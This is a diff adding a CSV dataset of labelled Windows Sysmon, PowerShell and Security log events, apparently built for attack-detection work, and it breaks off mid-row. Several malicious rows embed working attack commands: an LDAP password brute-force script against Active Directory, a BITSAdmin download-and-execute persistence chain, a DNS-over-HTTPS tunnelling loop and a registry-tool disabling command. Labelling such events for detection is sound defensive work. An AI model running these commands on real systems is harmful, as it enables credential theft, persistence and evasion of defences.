@@ -1,0 +1,934 @@
+sample_id,label,source_type,attack_category,scenario_name,source_file,provider,channel,event_id,timestamp,computer,user,image,command_line,parent_image,target_object,destination_ip,destination_hostname,query_name,script_block_text,event_summary,label_reason
+CYB499-001,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-17T16:44:00.9205352+00:00,Server002,SERVER002\lplui,C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe,"""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe""",C:\Windows\explorer.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe; cmd=""C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe""; parent=C:\Windows\explorer.exe; parent_cmd=""C:\Windows\explorer.exe""; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-002,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:21:28.3838228+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command whoami,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=8df8c3c6-8d62-47d7-8583-b1edaf8f1e3b
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command whoami
+	EngineVersion=5.1.19041.2673
+	RunspaceId=72a20c74-33ee-425f-a4e7-fa0c7e234cba
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command whoami; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-003,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.5762390,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL
+CYB499-004,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5058,2025-04-23T19:01:44.7316073+00:00,Server002,LOCAL SERVICE,,,,,,,,,Security event 5058 from Microsoft-Windows-Security-Auditing on Server002; user=LOCAL SERVICE,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-005,Malicious,Sysmon,Execution,execution-app-uninstall-using-wmic,data/raw/malicious/execution-app-uninstall-using-wmic-json/T1047-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-22 15:28:00.8661991,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The event uses WMIC to uninstall a target product over WMI, which is execution behavior tied to the scenario. Evidence: ""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall"
+CYB499-006,Malicious,Sysmon,Execution,execution-app-uninstall-using-wmic,data/raw/malicious/execution-app-uninstall-using-wmic-json/T1047-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-22 15:28:03.4495550,Server002,SERVER002\admin_test,C:\Windows\System32\wbem\WMIC.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\wbem\WMIC.exe; user=SERVER002\admin_test,"The event uses WMIC to uninstall a target product over WMI, which is execution behavior tied to the scenario. Evidence: C:\Windows\System32\wbem\WMIC.exe"
+CYB499-007,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5059,2025-04-23T19:01:44.7350827+00:00,Server002,LOCAL SERVICE,,,,,,,,,Security event 5059 from Microsoft-Windows-Security-Auditing on Server002; user=LOCAL SERVICE,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-008,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:55:23.8415066+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ~/Desktop/test.ps1,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=8489a2ed-03f4-42e2-8830-df6264a1b8bb
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ~/Desktop/test.ps1
+	EngineVersion=5.1.19041.2673
+	RunspaceId=b98d4c53-3b3b-4293-8fc1-b61d94a0ba76
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ~/Desktop/test.ps1; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-009,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4624,2025-04-23T19:01:06.9390403+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,,,,,,,Security event 4624 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\services.exe; cmd=C:\Windows\System32\services.exe; user=WORKGROUP\SERVER002$; detail=Successful logon,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-010,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4648,2025-04-30T10:09:32.2347107+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\winlogon.exe,C:\Windows\System32\winlogon.exe,,,,,,,Security event 4648 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\winlogon.exe; cmd=C:\Windows\System32\winlogon.exe; user=WORKGROUP\SERVER002$; detail=A logon was attempted using explicit credentials,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
+CYB499-011,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5215770,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Variable, Started, 	ProviderName=Variable
+	NewProviderState=Started
+
+	SequenceNumber=11
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-012,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T14:07:49.1013093+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ipconfig,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=13f77f91-182d-42e1-88d9-cec08938ab6a
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ipconfig
+	EngineVersion=5.1.19041.2673
+	RunspaceId=453c9c4f-a508-4805-b0e7-0d82e09c2d6f
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ipconfig; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-013,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2025-04-16T15:41:47.2011938+00:00,Server002,,,powershell.exe -ExecutionPolicy Restricted -Command,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=71190939-e7e0-4c68-b7b3-87eb740e651d
+	HostApplication=powershell.exe -ExecutionPolicy Restricted -Command 
+ $Res = 0
+ [UInt64]$MinDiskSpaceThreshold = 20 * 1024 * 1024 * 1024
+
+ try {
+ $SystemDrive = (Get-CimInstance Win32_OperatingSystem).SystemDrive
+ $SystemDriveLetter = $SystemDrive[0]
+ $SystemDriveSpace = (Get-Volume -DriveLetter $SystemDriveLetter).SizeRemaining
+ Write-Host 'Current system drive space:', $SystemDriveSpace.ToString('N0')
+ if ($SystemDriveSpace -lt $MinDiskSpaceThreshold) {
+ Write-Host 'System drive space is less than the threshold:', $MinDiskSpaceThreshold.ToString('N0'), 'Block Upgrade.'
+ $Res = 1
+ }
+ } catch {
+ # Do nothing
+ }
+
+ Write-Host 'Final result:', $Res
+
+	EngineVersion=5.1.19041.5007
+	RunspaceId=8120aef8-8e80-4dec-8db1-21a11cb6a652
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe -ExecutionPolicy Restricted -Command; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-014,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:59.1785987,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /complete fileBITS,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /complete fileBITS; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /complete fileBITS
+CYB499-015,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-24 13:19:18.5122741,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Environment, Started, 	ProviderName=Environment
+	NewProviderState=Started
+
+	SequenceNumber=5
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
+	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
+ Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
+ exit 1
+}
+
+[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
+$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)
+
+$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
+foreach ($password in $passwordList){
+ $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
+ $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
+ try {
+ Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
+ $conn.bind()
+ # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
+ Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
+ } catch {
+ Write-Host $_.Exception.Message
+ }
+}
+Write-Host ""End of bruteforce""}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
+CYB499-016,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.4170222,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline fileBITS C:\Windows\system32\notepad.exe NULL & bitsadmin.exe /resume fileBITS & ping -n 5 127.0.0.1 >nul 2>&1 & bitsadmin.exe /complete fileBITS",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\bitsadmin3_flag...; user=SERVER002\admin_test","The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: ""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %%temp%%\bitsadmin3_flag.ps1 & bitsadmin.exe /setnotifycmdline f..."
+CYB499-017,Malicious,Sysmon,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 15:11:09.8338813,Server002,SERVER002\admin_test,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\conhost.exe; cmd=\??\C:\Windows\system32\conhost.exe 0xffffffff -ForceV1; parent=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; parent_cmd=""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" ...; user=SERVER002\admin_test","This event is retained because its parent command line carries the same attack evidence: ""powershell.exe"" & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest \""""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT\"""" -UseBasicParsing).Content }}"
+CYB499-018,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-29T10:30:32.2030808+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe""",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Base.exe""; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 987b49e6-49dc-4a07-bf32-7abfd3f81174 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-019,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-05-02T08:52:34.4069081+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.562.0.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 14ed02b8-83a1-42f5-8af6-233f3cdcf576 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-020,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"FileSystem, Started, 	ProviderName=FileSystem
+	NewProviderState=Started
+
+	SequenceNumber=7
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
+	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
+$com.ActivateMicrosoftApp(""5"")}
+	EngineVersion=
+	RunspaceId=
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
+CYB499-021,Malicious,Sysmon,Discovery,discovery_discover_system_language_withchcp,data/raw/malicious/discovery_discover_system_language_withchcp_json/T1614.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 16:20:50.8800259,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c chcp",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c chcp; user=SERVER002\admin_test","The event uses chcp to inspect the system code page, which can reveal language or locale information. Evidence: ""cmd.exe"" /c chcp"
+CYB499-022,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:20:25.2262689+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=5b33f03a-9d03-4572-b5c4-54c3c3b2b930
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls
+	EngineVersion=5.1.19041.2673
+	RunspaceId=374f6804-2442-4166-9529-be30aab7645c
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command ls; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-023,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,400,2024-10-28 15:11:15.8193503,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.5007
+	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
+	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
+	EngineVersion=5.1.19041.5007
+	RunspaceId=6006f99d-554a-49e3-a5f8-1defe3b27241
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=","PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
+CYB499-024,Malicious,Sysmon,Defense Evasion,defense_evasion_disable_windows_registry_tool,data/raw/malicious/defense_evasion_disable_windows_registry_tool_json/T1112-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-24 14:46:00.2199015,Server002,SERVER002\admin_test,C:\Windows\System32\cmd.exe,"""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f",C:\Windows\System32\wsmprovhost.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\cmd.exe; cmd=""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f; parent=C:\Windows\System32\wsmprovhost.exe; parent_cmd=C:\Windows\system32\wsmprovhost.exe -Embedding; user=SERVER002\admin_test","The event modifies the DisableRegistryTools policy value to restrict registry tooling. Evidence: ""cmd.exe"" /c reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableRegistryTools /t REG_DWORD /d 1 /f"
+CYB499-025,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-29T10:30:42.2695249+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 987b49e6-49dc-4a07-bf32-7abfd3f81174 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
+CYB499-026,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:56:06.5263992+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $pass = ConvertTo-SecureString 123654AAaa.. -AsPlainText -Force,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=ConsoleHost
+	HostVersion=5.1.19041.2673
+	HostId=4ffc5ca3-c17f-4fc7-9acc-675644446699
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $pass = ConvertTo-SecureString 123654AAaa.. -AsPlainText -Force
+	EngineVersion=5.1.19041.2673
+	RunspaceId=805fc090-bf83-4bd7-9d47-2fb0e177a332
+	PipelineId=
+	CommandName=
+	CommandType=
+	ScriptName=
+	CommandPath=
+	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $pass = ConvertTo-SecureString 123654AAaa.. -AsPlainText -Force; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
+CYB499-027,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:54:01.3655928+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\admin_test\Desktop\test.ps1,,,,,,"Available, None, 	NewEngineState=Available
+	PreviousEngineState=None
+
+	SequenceNumber=13
+
+	HostName=Windows PowerShell ISE Host
+	HostVersion=5.1.19041.2673
+	HostId=24246766-eb79-4ac7-ada7-5cce2e047335
+	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\admin_test\Desktop\test.ps1
+	EngineVersion=5.1.19041.2673
+	RunspaceId=7b9db0f1-55ca-4d10-b05f-4a9395064fb2
+	PipelineId=
